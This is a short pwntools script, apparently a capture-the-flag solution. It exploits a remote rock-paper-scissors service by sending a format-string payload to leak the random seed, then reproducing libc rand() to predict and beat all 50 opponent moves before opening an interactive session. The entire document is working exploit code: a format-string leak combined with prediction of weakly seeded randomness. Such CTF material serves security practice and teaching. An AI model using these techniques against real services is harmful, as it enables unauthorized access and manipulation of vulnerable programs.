from pwn import *
from ctypes import CDLL
winning = {
    'r': 'p',
    'p': 's',
    's': 'r'
}
libc = CDLL('libc.so.6')
r = remote('vsc.tf', 3094)
r.sendline('%9$u')
r.recvuntil(b'Hi ')
seed = int(r.recvuntil(b'\n'))
libc.srand(seed)
for i in range(0, 0x32):
    opp_choice = 'rps'[libc.rand() % 3]
    r.sendline(winning[opp_choice])
r.interactive()
